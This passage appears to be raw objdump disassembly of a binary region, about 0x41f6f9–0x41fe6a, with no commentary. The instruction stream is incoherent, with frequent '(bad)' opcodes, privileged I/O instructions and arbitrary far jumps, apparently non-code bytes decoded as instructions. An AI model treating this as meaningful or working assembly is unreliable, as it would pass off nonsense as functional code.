  41f6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6fa:	xor    DWORD PTR [ebx-0x520b1a5f],ecx
  41f700:	mov    dl,0xa7
  41f702:	dec    edx
  41f703:	add    eax,0x6dbe4312
  41f708:	cmp    al,0xe0
  41f70a:	ja     0x41f749
  41f70c:	bound  ebx,QWORD PTR [eax]
  41f70e:	ins    DWORD PTR es:[edi],dx
  41f70f:	inc    eax
  41f710:	mov    cl,0x0
  41f712:	add    BYTE PTR [esi],ch
  41f714:	mov    cl,0xb1
  41f716:	repnz mov DWORD PTR [eax+eiz*2+0x0],0x9738b200
  41f71f:	ret    
  41f720:	aad    0xb8
  41f722:	arpl   WORD PTR [esi+0x41],bp
  41f725:	in     al,0x55
  41f727:	test   al,0x2a
  41f729:	stc    
  41f72a:	popa   
  41f72b:	xchg   esp,ebx
  41f72d:	jecxz  0x41f799
  41f72f:	mov    DWORD PTR [esi],eax
  41f731:	fistp  QWORD PTR [eax-0x76]
  41f734:	imul   esp,DWORD PTR [ebp-0x6d],0xce6806c2
  41f73b:	js     0x41f73d
  41f73d:	cmp    DWORD PTR [eax],eax
  41f73f:	add    BYTE PTR [ecx+ebp*1+0x2e],bl
  41f743:	arpl   WORD PTR gs:[ecx+0x11cc],dx
  41f74a:	test   bh,bl
  41f74c:	add    BYTE PTR [eax],al
  41f74e:	call   0xa9517864
  41f753:	sub    al,0x55
  41f755:	out    0x51,al
  41f757:	cmovae esp,DWORD PTR [ebp+0x75e74576]
  41f75e:	push   ebp
  41f75f:	inc    edx
  41f760:	js     0x41f7a8
  41f762:	pusha  
  41f763:	cmp    edx,0xd82d4de8
  41f769:	dec    ecx
  41f76a:	cmp    cl,bl
  41f76c:	push   ds
  41f76d:	sub    dl,al
  41f76f:	inc    eax
  41f770:	fadd   DWORD PTR [eax]
  41f772:	add    ah,ch
  41f774:	fist   WORD PTR [edi]
  41f776:	push   edi
  41f777:	fstp   QWORD PTR [edi+0x3e]
  41f77a:	gs jmp 0xeb813129
  41f780:	jmp    0x696347af
  41f785:	mov    DWORD PTR [edi+eiz*4],esp
  41f788:	rcr    BYTE PTR [esi+0x5f],cl
  41f78b:	dec    edx
  41f78c:	test   eax,0x5825546c
  41f791:	cld    
  41f792:	sbb    ah,bh
  41f794:	enter  0xe2,0x0
  41f798:	or     DWORD PTR [eax+0x324cb8fb],ebp
  41f79e:	add    BYTE PTR [eax],al
  41f7a0:	pushf  
  41f7a1:	inc    ecx
  41f7a2:	fs inc esi
  41f7a4:	or     edx,ebp
  41f7a6:	(bad)  
  41f7a7:	into   
  41f7a8:	xlat   BYTE PTR ds:[ebx]
  41f7a9:	push   ds
  41f7aa:	push   esp
  41f7ab:	pop    ss
  41f7ac:	enter  0xc8,0x0
  41f7b0:	test   dh,0xe7
  41f7b3:	jg     0x41f811
  41f7b5:	fsubr  DWORD PTR [ebx-0x145420dd]
  41f7bb:	sbb    eax,0x89aa9942
  41f7c0:	out    dx,eax
  41f7c1:	je     0x41f817
  41f7c3:	pmaxub mm3,mm2
  41f7c6:	fcomip st,st(2)
  41f7c8:	cmp    DWORD PTR [edi],esp
  41f7ca:	push   0x6ecf2461
  41f7cf:	xchg   edx,eax
  41f7d0:	sar    DWORD PTR [edi+0x3f],1
  41f7d3:	inc    edx
  41f7d4:	xchg   ebp,eax
  41f7d5:	xchg   ecx,eax
  41f7d6:	inc    edx
  41f7d7:	aaa    
  41f7d8:	jp     0x41f843
  41f7da:	es call 0x1217c25
  41f7e0:	add    BYTE PTR [esi],cl
  41f7e2:	(bad)  
  41f7e3:	jno    0x41f861
  41f7e5:	lods   eax,DWORD PTR ds:[esi]
  41f7e6:	ins    DWORD PTR es:[edi],dx
  41f7e7:	xor    DWORD PTR [esi],esi
  41f7e9:	inc    esi
  41f7ea:	rol    BYTE PTR [eax+0x69bc0000],0xd1
  41f7f1:	aaa    
  41f7f2:	ret    
  41f7f3:	loop   0x41f7f6
  41f7f5:	clc    
  41f7f6:	xchg   esp,eax
  41f7f7:	scas   eax,DWORD PTR es:[edi]
  41f7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7f9:	mov    ebp,0xc0d0f973
  41f7fe:	or     al,BYTE PTR [eax]
  41f800:	add    al,ah
  41f802:	lods   eax,DWORD PTR ds:[esi]
  41f803:	lods   al,BYTE PTR ds:[esi]
  41f804:	out    dx,eax
  41f805:	adc    eax,0xb216be5a
  41f80a:	cld    
  41f80b:	popf   
  41f80c:	mov    al,ds:0x35b3c79
  41f811:	xchg   esi,eax
  41f812:	pop    esp
  41f813:	mov    WORD PTR [edi],fs
  41f815:	add    BYTE PTR [eax],al
  41f817:	jle    0x41f87e
  41f819:	shr    eax,cl
  41f81b:	jno    0x41f849
  41f81d:	jbe    0x41f7a7
  41f81f:	add    BYTE PTR [eax],al
  41f821:	add    BYTE PTR [edx],ch
  41f823:	icebp  
  41f824:	xchg   edi,eax
  41f825:	mov    cl,0x35
  41f827:	jl     0x41f842
  41f829:	scas   eax,DWORD PTR es:[edi]
  41f82a:	fs aad 0x31
  41f82d:	dec    edi
  41f82e:	jnp    0x41f881
  41f830:	and    al,0xa2
  41f832:	sbb    eax,0xa70c5935
  41f837:	add    BYTE PTR [eax],al
  41f839:	inc    ecx
  41f83a:	jo     0x41f86f
  41f83c:	pop    esp
  41f83d:	mov    ah,0x5f
  41f83f:	imul   eax,ecx,0x334a6130
  41f845:	shl    BYTE PTR [ebx-0x29390000],0x5d
  41f84c:	repnz shl DWORD PTR [ebx+0x11ed286a],1
  41f853:	sahf   
  41f854:	imul   ecx,DWORD PTR [eax+0x190000b2],0xffffffd0
  41f85b:	pop    ss
  41f85c:	lds    edi,FWORD PTR [ebx-0x243b9e31]
  41f862:	add    BYTE PTR [eax],al
  41f864:	jecxz  0x41f8cc
  41f866:	push   es
  41f867:	mov    es,WORD PTR cs:[ebx-0x49]
  41f86b:	xor    BYTE PTR [ebx+0x7d],dl
  41f86e:	imul   esp,DWORD PTR [esi+eiz*2-0x4621200b],0xfffffff2
  41f876:	jmp    0x41f887
  41f878:	repnz test al,0x83
  41f87b:	push   0xc504
  41f880:	mov    ebx,0xad775374
  41f885:	stos   DWORD PTR es:[edi],eax
  41f886:	mov    cl,BYTE PTR [edi]
  41f888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f889:	lods   al,BYTE PTR ds:[esi]
  41f88a:	int    0x43
  41f88c:	cmp    bh,ah
  41f88e:	mov    dh,0x22
  41f890:	pop    ebp
  41f891:	mov    ds:0x18fd4623,eax
  41f896:	xchg   ebx,eax
  41f897:	or     BYTE PTR [edx+0x2f800000],dh
  41f89d:	add    BYTE PTR [eax],al
  41f89f:	jo     0x41f8d6
  41f8a1:	cmp    eax,0xae21094
  41f8a6:	scas   al,BYTE PTR es:[edi]
  41f8a7:	fldenv [edi]
  41f8a9:	std    
  41f8aa:	sbb    bh,al
  41f8ac:	pop    ebx
  41f8ad:	gs pop ebx
  41f8af:	jp     0x41f83e
  41f8b1:	sub    ecx,DWORD PTR [ebx+0xda13767]
  41f8b7:	inc    edx
  41f8b8:	jno    0x41f872
  41f8ba:	test   cl,ah
  41f8bc:	add    BYTE PTR [eax],al
  41f8be:	push   0x2b03115d
  41f8c3:	mov    WORD PTR [esi+0x0],ss
  41f8c6:	add    BYTE PTR [edx],bh
  41f8c8:	cli    
  41f8c9:	scas   eax,DWORD PTR es:[edi]
  41f8ca:	push   eax
  41f8cb:	push   edi
  41f8cc:	gs add bl,dh
  41f8cf:	add    BYTE PTR [eax],al
  41f8d1:	or     eax,0x9caecf1
  41f8d6:	stos   DWORD PTR es:[edi],eax
  41f8d7:	mov    edx,0xb6c4
  41f8dc:	sahf   
  41f8dd:	mov    cl,0x44
  41f8df:	dec    esi
  41f8e0:	add    BYTE PTR [eax],al
  41f8e2:	dec    ecx
  41f8e3:	sar    bh,cl
  41f8e5:	adc    eax,0x4744eb0a
  41f8ea:	add    BYTE PTR [eax],al
  41f8ec:	(bad)
  41f8f0:	js     0x41f952
  41f8f2:	ds mov eax,0x2c07148a
  41f8f8:	or     BYTE PTR [eax+0x0],0x0
  41f8fc:	and    BYTE PTR [esi+0x0],0x0
  41f900:	mov    ebx,0xf616a0ca
  41f905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f906:	shr    BYTE PTR [edx-0x1ced0000],0xfa
  41f90d:	dec    edi
  41f90e:	push   0xd6520a0b
  41f913:	repnz sub esi,DWORD PTR [edx+0x16]
  41f917:	mov    esi,DWORD PTR [edi-0x5a728f53]
  41f91d:	sub    edi,DWORD PTR [ecx+0x6f]
  41f920:	call   0x1af5:0x3062b4cf
  41f927:	push   0x7b
  41f929:	pop    esi
  41f92a:	adc    ebx,ebx
  41f92c:	lea    edx,[ebx]
  41f92e:	jne    0x41f944
  41f930:	scas   eax,DWORD PTR es:[edi]
  41f931:	mov    ecx,DWORD PTR [ebp+0x1d]
  41f934:	sub    al,0x56
  41f936:	mov    cl,0x8f
  41f938:	nop
  41f939:	xor    BYTE PTR [edx],dh
  41f93b:	in     eax,dx
  41f93c:	(bad)  
  41f93d:	(bad)  
  41f93e:	mov    ds:0xf8cc,al
  41f943:	push   eax
  41f944:	adc    BYTE PTR [ebp+0x14],0x92
  41f948:	pop    eax
  41f949:	pop    edx
  41f94a:	mov    ah,cl
  41f94c:	stos   DWORD PTR es:[edi],eax
  41f94d:	test   al,0xe7
  41f94f:	push   es
  41f950:	shl    DWORD PTR [ebp+0x21],0x55
  41f954:	cmp    edx,esi
  41f956:	jmp    0xec3:0x7a180e7b
  41f95d:	xor    eax,0xc186373e
  41f962:	pop    ebx
  41f963:	inc    esp
  41f964:	nop
  41f965:	add    BYTE PTR [eax],al
  41f967:	stos   DWORD PTR es:[edi],eax
  41f968:	repnz in al,dx
  41f96a:	ins    BYTE PTR es:[edi],dx
  41f96b:	jmp    0x41f955
  41f96d:	adc    BYTE PTR [ebp-0x3b],dl
  41f970:	mov    bl,dh
  41f972:	add    BYTE PTR [eax],al
  41f974:	xchg   esp,eax
  41f975:	xor    dh,ch
  41f977:	popf   
  41f978:	push   es
  41f979:	rcr    BYTE PTR [ebx+0xfc40000],0x0
  41f980:	add    ch,al
  41f982:	mov    eax,ds:0x7afaa91
  41f987:	gs test al,bh
  41f98a:	add    BYTE PTR [eax],al
  41f98c:	inc    esp
  41f98d:	std    
  41f98e:	add    BYTE PTR [eax],al
  41f990:	gs jne 0x41f961
  41f993:	gs movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41f996:	cmp    eax,0x94d6a7bd
  41f99b:	bound  ebx,QWORD PTR [ebx-0x14]
  41f99e:	(bad)  
  41f99f:	(bad)  
  41f9a0:	jmp    0x41f962
  41f9a2:	jno    0x41f9a4
  41f9a4:	add    dh,bh
  41f9a6:	dec    esi
  41f9a7:	js     0x41f9ef
  41f9a9:	dec    ebp
  41f9aa:	ins    DWORD PTR es:[edi],dx
  41f9ab:	mov    ecx,0x64016173
  41f9b0:	push   eax
  41f9b1:	mov    dl,dh
  41f9b3:	add    DWORD PTR [edx-0x68fa12d4],edi
  41f9b9:	(bad)
  41f9bd:	inc    eax
  41f9be:	jo     0x41f9c0
  41f9c0:	add    BYTE PTR [esp+edi*1-0x4b127250],dh
  41f9c7:	pop    ds
  41f9c8:	(bad)  
  41f9c9:	loop   0x41f9b6
  41f9cb:	rcr    edi,1
  41f9cd:	dec    ebx
  41f9ce:	sbb    DWORD PTR [ecx-0x43c4901e],0xf0c1edbf
  41f9d8:	push   0xd765efe
  41f9dd:	out    0x8,al
  41f9df:	out    dx,eax
  41f9e0:	add    BYTE PTR [eax],al
  41f9e2:	ins    DWORD PTR es:[edi],dx
  41f9e3:	pusha  
  41f9e4:	xor    ecx,DWORD PTR [edx]
  41f9e6:	outs   dx,BYTE PTR ds:[esi]
  41f9e7:	jge    0x41f977
  41f9e9:	mov    es:0xe9e6c301,eax
  41f9ef:	int    0x63
  41f9f1:	jne    0x41fa52
  41f9f3:	arpl   WORD PTR [ecx+0x49],bp
  41f9f6:	lock mov edi,0xcbc8ef
  41f9fc:	add    BYTE PTR [ebp+0xa],bh
  41f9ff:	mov    ch,0x2d
  41fa01:	aam    0x2f
  41fa03:	inc    edx
  41fa04:	mov    dh,0x4
  41fa06:	sub    DWORD PTR [eax],eax
  41fa08:	add    BYTE PTR ds:0x2b17eecf,ch
  41fa0e:	jl     0x41fa81
  41fa10:	and    BYTE PTR [edi],0x6c
  41fa13:	je     0x41fa08
  41fa15:	pop    ecx
  41fa16:	pop    ebx
  41fa17:	imul   ebx,DWORD PTR [esi],0xfffffffd
  41fa1a:	fldl2t 
  41fa1c:	outs   dx,BYTE PTR ds:[esi]
  41fa1d:	cli    
  41fa1e:	or     BYTE PTR [edx],bl
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	test   DWORD PTR [eax],0xf2000079
  41fa28:	xchg   ecx,ebx
  41fa2a:	aaa    
  41fa2b:	xor    al,0xe6
  41fa2d:	in     eax,dx
  41fa2e:	mov    DWORD PTR ds:0xdfd4e7e5,ebp
  41fa34:	loopne 0x41f9bd
  41fa36:	aas    
  41fa37:	scas   al,BYTE PTR es:[edi]
  41fa38:	push   0xe14d4edf
  41fa3d:	ins    DWORD PTR es:[edi],dx
  41fa3e:	mov    eax,0x7ee701d5
  41fa43:	xchg   esi,eax
  41fa44:	loope  0x41faa0
  41fa46:	or     al,0x1a
  41fa48:	add    BYTE PTR [eax],al
  41fa4a:	cdq    
  41fa4b:	mov    eax,ds:0xcaf81a7d
  41fa50:	stc    
  41fa51:	mov    ebx,0xc195724a
  41fa56:	adc    bl,BYTE PTR [ebp+0x4e]
  41fa59:	aad    0x6
  41fa5b:	mov    bh,BYTE PTR [esi]
  41fa5d:	jne    0x41fa24
  41fa5f:	jmp    0x32593606
  41fa64:	pop    ss
  41fa65:	rcr    esp,1
  41fa67:	xor    al,0x7b
  41fa69:	jno    0x41fad8
  41fa6b:	dec    esi
  41fa6c:	mov    cs,WORD PTR [esi+0x577b6a64]
  41fa72:	mov    ecx,0x47c2dc2e
  41fa77:	ss out 0x31,al
  41fa7a:	int    0xac
  41fa7c:	sbb    eax,0xe80cd
  41fa81:	add    bh,ah
  41fa83:	repnz daa 
  41fa85:	mov    al,0xb5
  41fa87:	daa    
  41fa88:	stos   BYTE PTR es:[edi],al
  41fa89:	imul   DWORD PTR ds:0xa920a8bb
  41fa8f:	xchg   edx,eax
  41fa90:	loope  0x41fa90
  41fa92:	push   esp
  41fa93:	sub    ebx,DWORD PTR [ebx+0x1b453a6f]
  41fa99:	(bad)  
  41fa9a:	mov    dl,0x48
  41fa9c:	jns    0x41fa9e
  41fa9e:	add    BYTE PTR [esi-0xe9c9ebf],ch
  41faa4:	jge    0x41fa43
  41faa6:	lods   eax,DWORD PTR ds:[esi]
  41faa7:	std    
  41faa8:	cmc    
  41faa9:	and    ecx,eax
  41faab:	jecxz  0x41fadf
  41faad:	cs ret 0x7e4d
  41fab1:	sub    al,0x3
  41fab3:	mov    esi,?
  41fab5:	add    BYTE PTR [eax],al
  41fab7:	push   es
  41fab8:	sub    dh,BYTE PTR [esi-0x30]
  41fabb:	inc    edx
  41fabc:	xchg   esi,eax
  41fabd:	sub    DWORD PTR [eax],esi
  41fabf:	fcomp  QWORD PTR [ebx+ebx*1+0x1526f814]
  41fac6:	lods   al,BYTE PTR ds:[esi]
  41fac7:	cmp    bh,BYTE PTR [ebx-0x78ba4727]
  41facd:	jbe    0x41fa8a
  41facf:	outs   dx,BYTE PTR ds:[esi]
  41fad0:	dec    eax
  41fad1:	pushf  
  41fad2:	add    BYTE PTR [eax],al
  41fad4:	pushf  
  41fad5:	into   
  41fad6:	adc    eax,0x94c927a7
  41fadb:	add    al,0xad
  41fadd:	add    BYTE PTR [eax],al
  41fadf:	or     al,0x85
  41fae1:	add    BYTE PTR [eax],al
  41fae3:	xor    DWORD PTR [eax],eax
  41fae5:	aaa    
  41fae6:	add    BYTE PTR [eax],al
  41fae8:	dec    eax
  41fae9:	mov    bl,0x0
  41faeb:	add    BYTE PTR [edx+0xb0af34d],ch
  41faf1:	push   ds
  41faf2:	stc    
  41faf3:	mov    ah,0xb9
  41faf5:	mov    edi,0x12bd249e
  41fafa:	mov    edx,0x4b759349
  41faff:	jne    0x41faa7
  41fb01:	retf   0x6ccf
  41fb04:	xor    eax,0x5a45c209
  41fb09:	repnz shr ebp,cl
  41fb0c:	arpl   WORD PTR [eax],dx
  41fb0e:	xchg   ebp,eax
  41fb0f:	and    dl,BYTE PTR ds:0x1b1124c7
  41fb15:	popf   
  41fb16:	and    DWORD PTR [ecx],edi
  41fb18:	mov    esi,DWORD PTR [eax-0x77]
  41fb1b:	sub    eax,0xb7c2ce77
  41fb20:	aaa    
  41fb21:	jmp    0xf8:0x4c03f347
  41fb28:	add    BYTE PTR [edi+eax*2+0x59711e36],dl
  41fb2f:	push   edi
  41fb30:	call   0x4e46:0x643263f5
  41fb37:	loope  0x41fac7
  41fb39:	adc    eax,0x3ae952a5
  41fb3e:	dec    ebx
  41fb3f:	pop    ebp
  41fb40:	push   eax
  41fb41:	xor    edi,ebp
  41fb43:	mov    bl,0xac
  41fb45:	inc    ebp
  41fb46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb47:	lods   eax,DWORD PTR ds:[esi]
  41fb48:	cmp    eax,esp
  41fb4a:	xchg   ebx,eax
  41fb4b:	push   esi
  41fb4c:	sub    eax,0xc3a65973
  41fb51:	xchg   BYTE PTR [ebx+0x14ae1727],ch
  41fb57:	clc    
  41fb58:	xchg   ecx,eax
  41fb59:	int    0x6a
  41fb5b:	data16 hlt 
  41fb5d:	repnz fist DWORD PTR ds:0x1c0f7e3a
  41fb64:	(bad)  
  41fb65:	rol    DWORD PTR [ecx+0x3f24328b],0x2c
  41fb6c:	sbb    BYTE PTR [ecx],0x0
  41fb6f:	add    cl,cl
  41fb71:	dec    edi
  41fb72:	sar    BYTE PTR [esi+0x6970000],0x17
  41fb79:	sbb    al,0xad
  41fb7b:	mov    DWORD PTR [edi-0x29069539],ecx
  41fb81:	mov    ds:0xebe5dc5b,eax
  41fb86:	mov    eax,0x3b52f190
  41fb8b:	jg     0x41fb6b
  41fb8d:	mov    bh,0xd1
  41fb8f:	lds    esi,FWORD PTR ds:[edx+0x723879dc]
  41fb96:	pop    edi
  41fb97:	repz out dx,al
  41fb99:	pop    ebx
  41fb9a:	jl     0x41fb21
  41fb9c:	int    0xe2
  41fb9e:	dec    esp
  41fb9f:	outs   dx,BYTE PTR ds:[esi]
  41fba0:	add    BYTE PTR [eax],al
  41fba2:	xchg   esi,eax
  41fba3:	dec    ebp
  41fba4:	push   edi
  41fba5:	out    0xdc,eax
  41fba7:	mov    bh,BYTE PTR [esi+0x63]
  41fbaa:	icebp  
  41fbab:	cdq    
  41fbac:	clc    
  41fbad:	arpl   WORD PTR [edi+0x6],si
  41fbb0:	fwait
  41fbb1:	xchg   edx,eax
  41fbb2:	adc    al,0xc6
  41fbb4:	cmp    ebp,DWORD PTR [eax-0x26]
  41fbb7:	sar    BYTE PTR [eax+0x61060000],0xd9
  41fbbe:	sar    BYTE PTR [esp+ebx*8],cl
  41fbc1:	and    bh,dl
  41fbc3:	rcl    BYTE PTR [eax+eax*1-0x2199ff00],0xa6
  41fbcb:	jmp    0xc5715ba0
  41fbd0:	and    DWORD PTR [edi+0x2b],eax
  41fbd3:	mov    ds:0x9833e6f0,eax
  41fbd8:	das    
  41fbd9:	push   0x49
  41fbdb:	push   ebp
  41fbdc:	jl     0x41fbc4
  41fbde:	out    dx,eax
  41fbdf:	les    edx,FWORD PTR [eax+eax*1+0x0]
  41fbe3:	mov    edi,0x3ff8ee13
  41fbe8:	xchg   edx,eax
  41fbe9:	push   ebx
  41fbea:	daa    
  41fbeb:	mov    eax,0xc4c4285e
  41fbf0:	add    BYTE PTR [eax],al
  41fbf2:	in     eax,dx
  41fbf3:	outs   dx,BYTE PTR ds:[esi]
  41fbf4:	cwde   
  41fbf5:	jmp    0x378a41b5
  41fbfa:	add    BYTE PTR [eax],al
  41fbfc:	arpl   bp,di
  41fbfe:	test   BYTE PTR [esi+0x7e590000],dh
  41fc04:	mov    ds,WORD PTR ds:0x5198f4d9
  41fc0a:	add    DWORD PTR [edi],esp
  41fc0c:	mov    bl,0x52
  41fc0e:	pushf  
  41fc0f:	jno    0x41fc64
  41fc11:	sub    BYTE PTR [esi-0x22417edf],dl
  41fc17:	test   ebx,0x26f51e42
  41fc1d:	sbb    eax,0x8837819b
  41fc22:	rol    BYTE PTR [eax],1
  41fc24:	add    BYTE PTR [ebx],dh
  41fc26:	push   edx
  41fc27:	sub    DWORD PTR [ebp+0x4d],esp
  41fc2a:	xchg   esp,eax
  41fc2b:	int3   
  41fc2c:	sldt   WORD PTR [eax]
  41fc2f:	lock out 0x2a,eax
  41fc32:	sub    eax,0x2ec4d896
  41fc37:	add    BYTE PTR [eax],al
  41fc39:	fistp  WORD PTR ds:[edi+0x24]
  41fc3d:	push   ebp
  41fc3e:	inc    esi
  41fc3f:	iret   
  41fc40:	add    esi,0xffffffe0
  41fc43:	fmul   DWORD PTR [esi-0x52]
  41fc46:	mov    edi,0xb340f2ec
  41fc4b:	add    BYTE PTR [eax],al
  41fc4d:	jmp    0x258e7e5b
  41fc52:	add    BYTE PTR [eax],al
  41fc54:	dec    esi
  41fc55:	lock pop ss
  41fc57:	push   esp
  41fc58:	ds popf 
  41fc5a:	pop    edi
  41fc5b:	xchg   esi,eax
  41fc5c:	ins    DWORD PTR es:[edi],dx
  41fc5d:	das    
  41fc5e:	repnz xlat BYTE PTR ds:[ebx]
  41fc60:	arpl   dx,dx
  41fc62:	push   es
  41fc63:	das    
  41fc64:	push   0x52
  41fc66:	int    0x1a
  41fc68:	mov    cl,0x46
  41fc6a:	bnd call 0x25984f1e
  41fc70:	or     al,0xcb
  41fc72:	add    BYTE PTR [eax],al
  41fc74:	test   dh,0xc6
  41fc77:	test   DWORD PTR [eax-0x16eb6c01],ebx
  41fc7d:	inc    ecx
  41fc7e:	adc    BYTE PTR [edi+0x2816bea2],ah
  41fc84:	jae    0x41fc95
  41fc86:	jl     0x41fc44
  41fc88:	push   es
  41fc89:	push   es
  41fc8a:	xor    DWORD PTR [edi+0x59a89716],edi
  41fc90:	push   0xffffffc3
  41fc92:	push   edx
  41fc93:	xor    eax,0x877a85a8
  41fc98:	test   al,0x3
  41fc9a:	dec    edx
  41fc9b:	ins    DWORD PTR es:[edi],dx
  41fc9c:	out    dx,al
  41fc9d:	hlt    
  41fc9e:	(bad)  
  41fc9f:	push   esi
  41fca0:	adc    eax,0xec081069
  41fca5:	add    BYTE PTR [eax],al
  41fca7:	icebp  
  41fca8:	and    BYTE PTR [ebp+0x9c849a],0x0
  41fcaf:	out    0xcf,eax
  41fcb1:	inc    edx
  41fcb2:	adc    BYTE PTR [edx+0x7d],0x45
  41fcb6:	repz sub ebp,DWORD PTR [esi+0x18]
  41fcba:	xchg   edi,eax
  41fcbb:	mov    bl,0xda
  41fcbd:	adc    BYTE PTR [ebx+esi*8],dl
  41fcc0:	stos   BYTE PTR es:[edi],al
  41fcc1:	inc    esi
  41fcc2:	clc    
  41fcc3:	mov    cl,0x99
  41fcc5:	dec    edx
  41fcc6:	and    eax,0xad4466
  41fccb:	add    dl,bl
  41fccd:	inc    edi
  41fcce:	test   BYTE PTR [edi+0x4d590000],cl
  41fcd4:	jno    0x41fc7c
  41fcd6:	or     bh,al
  41fcd8:	add    BYTE PTR [eax],al
  41fcda:	repnz mov dh,0x88
  41fcdd:	out    dx,eax
  41fcde:	add    BYTE PTR [eax],al
  41fce0:	mov    WORD PTR [eax+eax*1+0x78503a00],?
  41fce7:	clc    
  41fce8:	sbb    eax,0xe52a3118
  41fced:	pop    ebx
  41fcee:	imul   edx,edi,0x5a45e4f8
  41fcf4:	push   0xcd8d454d
  41fcf9:	cmp    cl,BYTE PTR [edi+0x1f778a83]
  41fcff:	lods   al,BYTE PTR ds:[esi]
  41fd00:	pop    ecx
  41fd01:	(bad)  [edi+0x607c246b]
  41fd07:	jns    0x41fcb0
  41fd09:	into   
  41fd0a:	sub    eax,0xb8c76bac
  41fd0f:	pushf  
  41fd10:	add    BYTE PTR [ebx+0x0],cl
  41fd13:	add    ch,dh
  41fd15:	mov    ecx,0x53741760
  41fd1a:	mov    esp,0xf5953b87
  41fd1f:	cmp    ah,0x9f
  41fd22:	ror    al,0x0
  41fd25:	add    BYTE PTR [eax+0x772b07ed],bh
  41fd2b:	out    0x73,eax
  41fd2d:	into   
  41fd2e:	in     al,dx
  41fd2f:	js     0x41fd62
  41fd31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd32:	fwait
  41fd33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd34:	and    al,BYTE PTR [esp+edi*2]
  41fd37:	add    BYTE PTR [eax],al
  41fd39:	xor    BYTE PTR [ebx+0x39],0xcd
  41fd3d:	adc    BYTE PTR [edi],bl
  41fd3f:	packsswb xmm4,XMMWORD PTR [ebp+0x76306097]
  41fd47:	aaa    
  41fd48:	lods   al,BYTE PTR ds:[esi]
  41fd49:	or     bl,BYTE PTR [ebp+0x488861]
  41fd4f:	add    bh,bh
  41fd51:	xor    bh,BYTE PTR [ecx+0x23]
  41fd54:	dec    edi
  41fd55:	xchg   dl,dh
  41fd57:	inc    ebx
  41fd58:	ret    0x637d
  41fd5b:	jecxz  0x41fda3
  41fd5d:	mov    bl,0xdb
  41fd5f:	(bad)  [edx+0x79]
  41fd62:	imul   eax,esi,0x3557eb82
  41fd68:	cmp    edx,DWORD PTR [ebp+0x19]
  41fd6b:	mov    eax,0xc8627ec6
  41fd70:	ret    
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	enter  0x91,0x0
  41fd77:	lods   al,BYTE PTR ds:[esi]
  41fd78:	(bad)  
  41fd79:	push   ds
  41fd7a:	stc    
  41fd7b:	push   es
  41fd7c:	or     eax,DWORD PTR [ebp+0x11]
  41fd7f:	mov    dl,0x30
  41fd81:	add    edx,edi
  41fd83:	xor    eax,0x76785a17
  41fd88:	mov    edx,0x33602776
  41fd8d:	pushf  
  41fd8e:	pop    ss
  41fd8f:	jmp    0xb8aad9b6
  41fd94:	imul   ebx,DWORD PTR [eax+0x21],0x3a27c57d
  41fd9b:	out    0xf3,eax
  41fd9d:	(bad)  [esi+0x645790fe]
  41fda3:	inc    edi
  41fda4:	test   al,0x22
  41fda6:	mov    WORD PTR [edx+0x0],?
  41fda9:	add    dh,dh
  41fdab:	pushf  
  41fdac:	test   DWORD PTR [edx-0x26],esp
  41fdaf:	stos   BYTE PTR es:[edi],al
  41fdb0:	sub    al,ah
  41fdb2:	inc    esi
  41fdb3:	adc    eax,0x44f1a47a
  41fdb8:	add    BYTE PTR ds:[eax],al
  41fdbb:	inc    ebp
  41fdbc:	pop    ds
  41fdbd:	test   BYTE PTR [ebx+0x0],cl
  41fdc0:	add    BYTE PTR [edi-0x47],dh
  41fdc3:	xchg   cl,bh
  41fdc5:	cmc    
  41fdc6:	dec    esi
  41fdc7:	push   esi
  41fdc8:	(bad)  
  41fdc9:	dec    ecx
  41fdca:	jmp    0x7929:0x9dff28d0
  41fdd1:	and    al,BYTE PTR [esi]
  41fdd3:	in     al,0x45
  41fdd5:	mov    ds:0x9188a0,al
  41fdda:	add    BYTE PTR [ebx+ecx*1+0x1f],dh
  41fdde:	icebp  
  41fddf:	cs sahf 
  41fde1:	xchg   ecx,edi
  41fde3:	mov    dh,0x91
  41fde5:	inc    eax
  41fde6:	jmp    0xd7befdeb
  41fdeb:	jg     0x41fdc0
  41fded:	sub    BYTE PTR [edi],al
  41fdef:	mov    ss,WORD PTR [edi+0x79]
  41fdf2:	mov    ebp,0x71c39e4
  41fdf7:	cdq    
  41fdf8:	out    0x0,al
  41fdfa:	mov    BYTE PTR [eax],al
  41fdfc:	add    BYTE PTR [eax+0x6a],dl
  41fdff:	jb     0x41fe12
  41fe01:	dec    esi
  41fe02:	pop    esp
  41fe03:	jge    0x41fdff
  41fe05:	loop   0x41fe84
  41fe07:	js     0x41fe6a
  41fe09:	loopne 0x41fdc1
  41fe0b:	add    al,0xc3
  41fe0d:	add    BYTE PTR [eax],al
  41fe0f:	int3   
  41fe10:	imul   eax,DWORD PTR [eax],0x0
  41fe13:	pop    ds
  41fe14:	mov    dl,0x8a
  41fe16:	jns    0x41fdad
  41fe18:	xor    esp,ebp
  41fe1a:	add    DWORD PTR [eax+0x68685233],ebx
  41fe20:	and    ecx,esi
  41fe22:	push   ds
  41fe23:	repz and eax,0x2a8c3d59
  41fe29:	add    BYTE PTR [eax],al
  41fe2b:	xchg   esp,eax
  41fe2c:	ror    al,cl
  41fe2e:	mov    ch,0x0
  41fe30:	add    BYTE PTR [eax+0x1d068f27],ah
  41fe36:	adc    al,0xe2
  41fe38:	shl    BYTE PTR [edi-0x2ab79c27],1
  41fe3e:	add    BYTE PTR [eax],al
  41fe40:	sub    ebx,DWORD PTR [ebx-0x547cce92]
  41fe46:	adc    ah,BYTE PTR [eax-0x2420f57d]
  41fe4c:	cmp    ebx,DWORD PTR [ebx+0xa20c]
  41fe52:	ret    0xee66
  41fe55:	mov    ch,0x3
  41fe57:	cmp    BYTE PTR [edx+0x1b],dl
  41fe5a:	mov    dh,0x60
  41fe5c:	lock push ecx
  41fe5e:	inc    eax
  41fe5f:	fadd   QWORD PTR [eax]
  41fe61:	add    BYTE PTR [esi],ah
  41fe63:	sub    ebx,DWORD PTR [edx-0x7e943460]
  41fe69:	into   
  41fe6a:	and    cl,BYTE PTR [ebp-0x277296c4]
